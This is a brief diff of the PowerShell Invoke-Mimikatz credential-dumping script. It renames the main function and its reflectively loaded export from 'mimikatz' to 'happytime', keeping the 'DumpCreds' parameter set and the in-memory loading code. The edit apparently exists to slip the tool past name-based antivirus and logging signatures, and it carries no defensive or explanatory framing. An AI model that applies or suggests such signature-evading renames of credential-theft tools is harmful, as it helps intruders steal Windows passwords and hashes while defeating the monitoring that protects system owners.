@@ -1,4 +1,4 @@
-function Invoke-Mimikatz
+function Invoke-happytime
 {
 
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
@@ -2571,7 +2571,7 @@ $RemoteScriptBlock = {
 			### YOUR CODE GOES HERE
 			#########################################
                     Write-Verbose "Calling function with WString return type"
-				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_happytime"
 				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
 				    {
 					    Throw "Couldn't find function address."
